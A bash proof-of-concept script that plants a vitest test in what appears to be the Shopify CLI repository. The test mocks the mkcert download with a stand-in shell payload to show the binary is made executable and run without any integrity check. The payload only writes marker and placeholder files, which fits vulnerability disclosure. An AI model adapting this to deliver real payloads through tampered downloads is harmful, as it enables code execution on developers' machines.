#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
mkdir -p "$EVIDENCE_DIR"

SPEC_NAME="mkcert-poc-$$.test.ts"
SPEC_PATH="$REPO_ROOT/packages/app/src/cli/utilities/$SPEC_NAME"
SPEC_REL="packages/app/src/cli/utilities/$SPEC_NAME"

cleanup() {
  rm -f "$SPEC_PATH"
}
trap cleanup EXIT

cat > "$SPEC_PATH" <<'TS'
import {mkdtemp, readFile, stat, writeFile} from 'node:fs/promises'
import {join} from 'node:path'
import {tmpdir} from 'node:os'
import {expect, test, vi} from 'vitest'

vi.mock('../prompts/dev.js', () => ({
  generateCertificatePrompt: vi.fn(async () => true),
}))

vi.mock('@shopify/cli-kit/node/http', async (importOriginal) => {
  const actual: any = await importOriginal()
  const payload = [
    '#!/bin/sh',
    'impact="$POC_IMPACT_DIR/impact.log"',
    'args="$*"',
    'key=""',
    'cert=""',
    'while [ "$#" -gt 0 ]; do',
    '  case "$1" in',
    '    -key-file) shift; key="$1" ;;',
    '    -cert-file) shift; cert="$1" ;;',
    '  esac',
    '  shift || true',
    'done',
    '{',
    '  echo "EXECUTED_MALICIOUS_MKCERT"',
    '  echo "argv=$args"',
    '  echo "payload_path=$0"',
    '} > "$impact"',
    'if [ -n "$key" ]; then printf "poc-key\\n" > "$key"; fi',
    'if [ -n "$cert" ]; then printf "poc-cert\\n" > "$cert"; fi',
    'exit 0',
    '',
  ].join('\n')

  return {
    ...actual,
    fetch: vi.fn(async (url: unknown) => {
      const requested = String(url)
      if (requested === 'https://github.com/FiloSottile/mkcert/releases/download/v1.4.4/mkcert-v1.4.4-linux-amd64') {
        return new actual.Response(payload, {status: 200, statusText: 'OK'})
      }
      if (requested === 'https://raw.githubusercontent.com/FiloSottile/mkcert/refs/tags/v1.4.4/LICENSE') {
        return new actual.Response('mkcert license placeholder', {status: 200, statusText: 'OK'})
      }
      throw new Error(`unexpected network request: ${requested}`)
    }),
  }
})

import {generateCertificate} from './mkcert.js'

test('attacker-controlled mkcert release bytes are chmodded and executed', async () => {
  const impactDir = process.env.POC_IMPACT_DIR
  expect(impactDir).toBeTruthy()

  const oldPath = process.env.PATH
  process.env.PATH = '/usr/bin:/bin'

  try {
    const appDirectory = await mkdtemp(join(tmpdir(), 'shopify-mkcert-poc-'))
    const result = await generateCertificate({appDirectory, platform: 'linux', arch: 'x64'})

    const downloadedPath = join(appDirectory, '.shopify', 'mkcert')
    const mode = (await stat(downloadedPath)).mode & 0o777
    const impact = await readFile(join(impactDir!, 'impact.log'), 'utf8')

    await writeFile(
      join(impactDir!, 'impact-summary.log'),
      [
        `appDirectory=${appDirectory}`,
        `downloadedPath=${downloadedPath}`,
        `downloadedMode=${mode.toString(8)}`,
        `returnedCertPath=${result.certPath}`,
        `keyContent=${JSON.stringify(result.keyContent)}`,
        `certContent=${JSON.stringify(result.certContent)}`,
        'impact:',
        impact,
      ].join('\n'),
    )

    expect(mode & 0o111).not.toBe(0)
    expect(impact).toContain('EXECUTED_MALICIOUS_MKCERT')
    expect(impact).toContain('-install')
    expect(result.keyContent).toBe('poc-key\n')
    expect(result.certContent).toBe('poc-cert\n')
    expect(result.certPath).toBe(join('.shopify', 'localhost.pem'))

    console.log(`POC_MARKER downloaded mkcert executed without integrity check; mode=${mode.toString(8)}`)
  } finally {
    process.env.PATH = oldPath
  }
})
TS
cp "$SPEC_PATH" "$EVIDENCE_DIR/mkcert-poc.vitest.test.ts"

printf 'Repository: %s\nNode: %s\npnpm: %s\n' \
  "$REPO_ROOT" "$(node -v 2>/dev/null || echo unavailable)" "$(pnpm -v 2>/dev/null || echo unavailable)" > "$EVIDENCE_DIR/env-info.txt"

{
  echo "healthcheck: verifying toolchain and target source files"
  cd "$REPO_ROOT" || exit 1
  test -x node_modules/.bin/vitest && echo "vitest: available"
  test -f packages/app/src/cli/utilities/mkcert.ts && echo "mkcert.ts: present"
  test -f packages/cli-kit/src/public/node/github.ts && echo "github.ts: present"
  if command -v mkcert >/dev/null 2>&1; then
    echo "system mkcert present but test PATH is constrained to /usr/bin:/bin"
  else
    echo "system mkcert: absent from current PATH"
  fi
} > "$EVIDENCE_DIR/healthcheck.log" 2>&1

(
  cd "$REPO_ROOT" || exit 1
  POC_IMPACT_DIR="$EVIDENCE_DIR" CI=1 SHOPIFY_CLI_ENV=development pnpm exec vitest run "$SPEC_REL" --config packages/app/vite.config.ts
) > "$EVIDENCE_DIR/exploit.log" 2>&1
rc=$?

cat "$EVIDENCE_DIR/exploit.log"

if [ "$rc" -eq 0 ] && grep -q 'EXECUTED_MALICIOUS_MKCERT' "$EVIDENCE_DIR/impact.log" 2>/dev/null; then
  echo '{"status":"confirmed","evidence":"downloaded .shopify/mkcert payload executed and wrote impact.log","notes":"controlled fetch response simulates compromised GitHub release asset"}'
  exit 0
fi

echo "PoC failed; vitest exit code: $rc" >> "$EVIDENCE_DIR/impact.log"
echo '{"status":"failed","evidence":"mkcert payload execution marker not observed","notes":"see evidence/exploit.log"}'
exit 1
